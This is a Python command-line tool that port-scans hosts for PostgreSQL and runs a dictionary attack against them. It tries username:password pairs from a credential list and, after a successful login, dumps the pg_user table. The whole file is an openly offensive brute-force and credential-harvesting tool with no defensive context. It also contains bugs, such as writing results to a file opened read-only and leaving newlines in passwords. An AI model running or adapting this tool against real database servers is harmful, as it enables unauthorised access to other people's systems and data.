import argparse
import time
import asyncio
import asyncpg
from typing import List
from collections import namedtuple

timeout = 1.0
SSL_MODE = "prefer"  # Try SSL first and fallback to non-SSL if failed
POSTGRES_PORT = 5432
DATABASE_NAME = "postgres"

Match = namedtuple("Match", "username password host database data")


async def try_hosts(hosts: List[str], port: int = POSTGRES_PORT):
    found = 0
    for host in hosts:
        try:
            future = asyncio.open_connection(host=host, port=port)
            _, w = await asyncio.wait_for(future, timeout=timeout)
            yield host
            found += 1
            w.close()
        except asyncio.TimeoutError:
            pass  # closed


async def try_connection(host: str, database: str, dictionary: str):
    with open(dictionary, "r") as cred_dictionary:
        for line in cred_dictionary:
            username, password = line.split(":")
            try:
                conn = await asyncpg.connect(
                    user=username,
                    password=password,
                    database=database,
                    host=host,
                    ssl=SSL_MODE,
                    timeout=timeout,
                )
                data = await conn.fetch("SELECT * from pg_user;")
                yield Match(username, password, host, database, data)
                await conn.close()
            except asyncpg.exceptions._base.PostgresError:
                pass  # bad username, password, access or other
            except asyncio.TimeoutError:
                pass  # closed


async def scan(hosts: List[str], dictionary: str):
    open_hosts = []
    async for open_host in try_hosts(hosts):
        open_hosts.append(open_host)

    print(f"Found open hosts {open_hosts}, trying to connect")
    matched_connections = []

    for host in open_hosts:
        async for match in try_connection(
            host, DATABASE_NAME, dictionary
        ):
            matched_connections.append(match)
    return matched_connections


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Port scan and dictionary attack postgresql servers."
    )
    parser.add_argument(
        "hosts", metavar="host", type=str, nargs="+", help="host to connect to"
    )
    parser.add_argument(
        "--dictionary", type=str, default="credentials.txt", help="dictionary list"
    )
    parser.add_argument(
        "--results", type=str, help="path to a results file"
    )
    args = parser.parse_args()
    start = time.time()

    results = asyncio.run(scan(args.hosts, args.dictionary))

    if args.results:
        with open(args.results) as results_f:
            results_f.writelines(results)

    for result in results:
        print(f"{result}")

    print("Completed scan in {0} seconds".format(time.time() - start))
